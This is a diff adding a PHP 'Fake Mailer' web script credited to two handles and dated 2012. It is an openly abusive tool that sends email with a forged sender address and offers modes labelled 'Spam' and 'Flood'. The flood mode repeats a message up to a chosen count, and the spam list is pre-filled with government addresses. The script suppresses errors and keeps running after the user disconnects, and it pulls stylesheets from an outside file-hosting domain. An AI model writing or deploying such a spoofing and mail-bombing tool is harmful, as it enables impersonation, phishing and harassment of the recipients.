@@ -1,0 +1,60 @@
+﻿<center></center>
+<title>Fake Mailer Made By My Revolution and Syahmie </title>
+<link rel="stylesheet" type="text/css" href="http://filehosting-cin1team.biz/howsecureismypassword/screen.css" />
+<link rel="stylesheet" type="text/css" href="http://filehosting-cin1team.biz/cpanel.css" />
+
+
+
+<center>Quote:<?php /*
+© Syahmie
+*/ ?> <title>Fake Mailer by MY Revolution and Syahmie</title> <?php //
+error_reporting (0); if(!set_time_limit(0)) {
+$limit = false; } else {
+set_time_limit(0);
+ignore_user_abort(1);
+$limit = true; }
+
+$log = 'log.txt'; // Log file
+
+ini_set('max_execution_time', '0');
+
+?>
+set_time_limit(0) = <?php if($limit)echo('<font color=Green>On</font>');else
+echo('<font color=red>Off</font> (Working time is limited with the current settings of the server)');?></center><br> <?php
+
+$ip = getenv('REMOTE_ADDR'); if($_GET['mail'] == '1' || $_GET['mail'] == '2' || $_GET['mail'] == '3') {
+
+$_POST['to'] = stripslashes($_POST['to']);
+$_POST['msg'] = stripslashes($_POST['msg']);
+$_POST['from'] = stripslashes($_POST['from']);
+$_POST['subject'] = stripslashes($_POST['subject']);
+if($_POST['to'] && $_POST['msg'] && $_POST['from'] && $_POST['tipe']) {
+$headers = "MIME-Version: 1.0\r\n";
+$headers .= "Content-type: text/".$_POST['tipe']."; charset=windows-1251\r\n";
+$headers .= "From: ".$_POST['from']."\n"; if($_GET['mail'] == '1') {
+mail($_POST['to'], $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message'); }
+elseif($_GET['mail'] == '2') {
+$_POST['to'] = explode("\n",$_POST['to']); foreach($_POST['to'] as $poluchatels) {
+mail($poluchatels, $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message'); } }
+elseif($_GET['mail'] == '3') { if(preg_match('/[0-9]+/',$_POST['kol'])) { for($i=0;$i<$_POST['kol'];$i++) {
+mail($_POST['to'], $_POST['subject'], $_POST['msg'], $headers) or die('Cannot send the message');
+sleep(1); } } else {
+echo('Incorrect (or not entered) number of messages'); } }
+$f = fopen($log,'a');
+fwrite($f,'Message sent &'.$_POST['msg'].'& with subject "'.$_POST['subject'].'" for "'.$_POST['to'].'" from IP - "'.$ip."\"\r\n");
+fclose($f);
+echo('<center><b><font color="green">Message succesfully sent</font></b></center>'); } else { ?> <form style="width:350px" method='post'> <?php if($_GET['mail'] == '1' || $_GET['mail'] == '3') {
+echo("Receiver <input type='text'name='to'><br>"); } ?>
+Sender <input type='text' name='from'><br>
+Subject <input type='text' name='subject'><br> <?php if($_GET['mail'] == '3') {
+echo("Amount of messages <input type='text' name='kol'><br>"); } ?> <br>
+htm -> <input type='radio' checked='checked' tabindex='1' name='tipe' value='html'> :: <input type='radio' name='tipe' value='plain'><- text<br> <?php if($_GET['mail'] == '2') {
+echo("Receivers<br><textarea name='to' rows='10' cols='30'>admin@fbi.org
+admin@cia.org
+admin@whitehouse.org</textarea>"); } ?> <br>Message<br> <textarea name='msg' rows='10' cols='30'></textarea><br><br><input type='submit'> </form> <?php } } else { ?><br>
+<center><a href='<?php $_SERVER['PHP_SELF']?>?mail=1'>Send simple message</a><br>
+<a href='<?php $_SERVER['PHP_SELF']?>?mail=2'>Spam</a><br>
+<a href='<?php $_SERVER['PHP_SELF']?>?mail=3'>Flood</a><br></center>
+<p class="copyright">&copy; MY <a href="http://www.facebook.com/izam.lukman">Revolution</a> by <a href="http://www.facebook.com/MoneyCash11">Syahmie, 2012</a></p>
+ <?php 
+}
